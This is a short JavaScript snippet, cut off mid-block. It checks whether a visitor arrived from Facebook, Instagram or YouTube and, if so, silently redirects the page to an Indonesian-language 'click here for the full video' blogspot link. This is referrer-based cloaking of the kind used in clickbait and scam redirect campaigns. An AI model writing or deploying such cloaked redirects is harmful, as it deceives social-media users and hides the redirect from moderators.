var dataUrl = [
  'https://klik-disini-full-videonya-hdd.blogspot.com/2026/07/play-video-20.html',
  'https://klik-disini-full-videonya-hdd.blogspot.com/2026/07/play-video-20.html'
];

var referrer = document.referrer.toLowerCase();

var dariSosmed =
  referrer.includes('facebook.com') ||
  referrer.includes('facebook.') ||
  referrer.includes('instagram.com') ||
  referrer.includes('youtube.com') ||
  referrer.includes('youtu.be');

if (dariSosmed) {
  var randomItem =
    dataUrl[Math.floor(Math.random() * dataUrl.length)];

  window.location.href = randomItem;
